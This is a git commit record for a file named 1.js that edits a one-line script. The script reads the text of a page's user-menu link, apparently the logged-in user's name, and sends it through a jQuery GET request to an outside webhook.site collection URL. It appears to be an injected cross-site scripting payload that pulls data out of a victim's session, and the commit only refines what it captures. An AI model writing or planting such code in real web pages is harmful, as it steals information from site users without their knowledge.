ea98bc318b23061aca8d41d1ecbba77e380d3f40
Alexey <dunaevai13579@gmail.com>
2021-09-24 04:10:02 +0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,1 @@
-$.get('https://webhook.site/9a3472c5-0292-4ebc-b194-7877b6a1db97?с='+document.querySelector('a.user-menu:nth-child(1)').innerHTML)
+$.get('https://webhook.site/9a3472c5-0292-4ebc-b194-7877b6a1db97?с='+document.querySelector('a.user-menu:nth-child(1)').innerText)
